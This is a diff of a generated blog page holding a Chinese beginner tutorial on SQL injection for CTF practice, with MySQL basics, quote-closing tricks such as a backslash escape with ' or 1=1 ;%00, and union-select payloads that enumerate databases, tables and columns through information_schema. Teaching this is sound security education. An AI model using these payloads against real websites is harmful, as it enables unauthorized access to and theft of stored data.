@@ -127,7 +127,7 @@
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
         <li class="menu-item menu-item-tags">
@@ -269,50 +269,32 @@
       
         <h1 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h1><p>从零开始学习SQL注入。以下内容从nep冬令营SQL注入讲解视频以及对应课件中整理。</p>
 <span id="more"></span>
-
 <h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><h3 id="mysql基础操作"><a href="#mysql基础操作" class="headerlink" title="mysql基础操作"></a>mysql基础操作</h3><p>登录数据库：</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>
-
 <p>查看库名:</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases</span><br></pre></td></tr></table></figure>
-
 <p>创建库、删除库、使用库</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database mrkaixin</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop database mrkaixin</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mrkaixin</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table user(</span><br><span class="line">-&gt; `id` int(<span class="number">11</span>)</span><br><span class="line">-&gt; `name` varchar(<span class="number">255</span>)</span><br><span class="line">-&gt; );</span><br></pre></td></tr></table></figure>
-
 <h3 id="mysql表的一些基本操作-增删查改"><a href="#mysql表的一些基本操作-增删查改" class="headerlink" title="mysql表的一些基本操作(增删查改)"></a>mysql表的一些基本操作(增删查改)</h3><h4 id="Insert"><a href="#Insert" class="headerlink" title="Insert :"></a>Insert :</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mrkaixin <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;nepnep&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
 <h4 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mrkaixin <span class="keyword">where</span> xxxx;</span><br></pre></td></tr></table></figure>
-
 <h4 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update mrkaixin <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
-
 <h4 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mrkaixin;</span><br></pre></td></tr></table></figure>
-
 <p>备注：<code>*</code>表示输出全部字段。</p>
 <h3 id="mysql的常用的变量-函数"><a href="#mysql的常用的变量-函数" class="headerlink" title="mysql的常用的变量(函数)"></a>mysql的常用的变量(函数)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Database()    <span class="operator">/</span><span class="operator">/</span>查看当前的用户名</span><br><span class="line"><span class="number">2.</span> <span class="keyword">User</span>()        <span class="operator">/</span><span class="operator">/</span>用户</span><br><span class="line"><span class="number">3.</span> Version()     <span class="operator">/</span><span class="operator">/</span>mysql版本</span><br><span class="line"><span class="number">4.</span> @<span class="variable">@basedir</span>     <span class="operator">/</span><span class="operator">/</span>安装路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <h3 id="mysql中的常用的符号"><a href="#mysql中的常用的符号" class="headerlink" title="mysql中的常用的符号"></a>mysql中的常用的符号</h3><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. &amp;   and</span><br><span class="line">2. ||  or</span><br><span class="line">3. ^   xor</span><br></pre></td></tr></table></figure>
-
 <p>mysql中常用的函数</p>
 <h4 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Substr(database(),1,1)</span><br><span class="line">Subtring</span><br><span class="line">Mid(database(),1,1)</span><br><span class="line">Left(database(),1)</span><br></pre></td></tr></table></figure>
-
 <h4 id="编码函数"><a href="#编码函数" class="headerlink" title="编码函数"></a>编码函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ascii()</span><br><span class="line">Hex()</span><br><span class="line">Char()      &#x2F;&#x2F;ascii()的逆函数</span><br></pre></td></tr></table></figure>
-
 <h4 id="文件函数"><a href="#文件函数" class="headerlink" title="文件函数"></a>文件函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Load_file()   &#x2F;&#x2F;读取文件内容</span><br></pre></td></tr></table></figure>
-
 <h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入起手式"><a href="#SQL注入起手式" class="headerlink" title="SQL注入起手式"></a>SQL注入起手式</h3><h4 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h4><p>常见的注释符</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. #(%23)</span><br><span class="line">2. --+</span><br><span class="line">3. ;%00</span><br><span class="line">4. &#96;</span><br></pre></td></tr></table></figure>
-
 <p>思考:</p>
 <p>如果在CTF中，把常用的注释符，以及单引号都按了，那么又该怎么闭合呢？</p>
 <p>这里我们通过使用在<code>&quot;\&quot;</code>来将<code>$username</code>后面的单引号转义。然后我们想办法在<code>$password</code>部分注释掉后面的单引号。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> data <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;\&#x27;</span><span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27; or 1=1 ;%00&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>第二个单引号被\转义了。第一个和第三个单引号之间的值为username的值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="keyword">or</span>后面是输入的password的值，;<span class="operator">%</span><span class="number">00</span>可以用来闭合后面的单引号。</span><br></pre></td></tr></table></figure>
-
 <h3 id="SQL注入的常见姿势"><a href="#SQL注入的常见姿势" class="headerlink" title="SQL注入的常见姿势"></a>SQL注入的常见姿势</h3><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><h5 id="联合查询的基本要求："><a href="#联合查询的基本要求：" class="headerlink" title="联合查询的基本要求："></a>联合查询的基本要求：</h5><p>1、查询列数必须一致</p>
 <p>2、查询语句的查询的各列类型、顺序最好一致</p>
 <h5 id="联合查询的步骤"><a href="#联合查询的步骤" class="headerlink" title="联合查询的步骤"></a>联合查询的步骤</h5><p>1、闭合</p>
@@ -322,11 +304,9 @@
 <p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p>
 <p> SQL UNION语法：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
-
 <p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
 <p> SQL UNION ALL 语法</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
-
 <p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
 <p><img src="C:/Users/13611/AppData/Roaming/Typora/typora-user-images/image-20210501122431780.png" alt="image-20210501122431780"></p>
 <h5 id="判断结果输出位置"><a href="#判断结果输出位置" class="headerlink" title="判断结果输出位置"></a>判断结果输出位置</h5><p>这里我们可以看到，如果是1的话，如果数据库中是存在id = 1 ，那么就会返回两行数据，但是由于limit 0,1 。Mysql总会返回第一条数据。所以自然是返回原来查询的，所以这里我们id = -1 或者其他不存在的列，那么第一行就一定是我们自己控制的了。</p>
@@ -337,13 +317,10 @@
 </blockquote>
 <p>爆破库名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()</span><br></pre></td></tr></table></figure>
-
 <p>爆表名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(table_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
-
 <p>爆Column名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
-
 <p>表名列名都有了之后，我们便可以通过，自由构造语句来获取获取每一个表中的信息了。</p>
 <h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在没法使用union联合查询时使用，前提是不能过滤一些关键函数。</p>
 <p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
@@ -467,7 +444,7 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -653,7 +630,37 @@
 
 
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"left","width":250,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"left","width":250,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+</body>
 </html>
 <!-- 页面点击小红心 -->
 <script type="text/javascript" src="/js/click-love.js"></script>
